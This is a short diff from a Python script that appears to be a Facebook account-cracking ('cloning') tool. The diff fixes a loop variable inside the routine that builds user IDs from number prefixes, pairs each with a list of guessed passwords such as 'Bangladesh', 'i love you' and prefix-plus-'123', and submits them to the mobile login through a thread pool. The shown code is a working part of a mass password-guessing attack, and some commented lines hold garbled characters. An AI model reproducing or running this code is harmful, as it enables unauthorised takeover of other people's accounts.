@@ -215,7 +215,7 @@ def id():
 		#jalan(f'\033[0;97m[{xr}âœ“] \033[0;94mSuper Fast Speed Cloning')
 		#jalan('\033[1;97mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
 		
-		for sai in user:
+		for guru in user:
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
 			NAYAN.submit(mbasic,uid,pwx,tl)
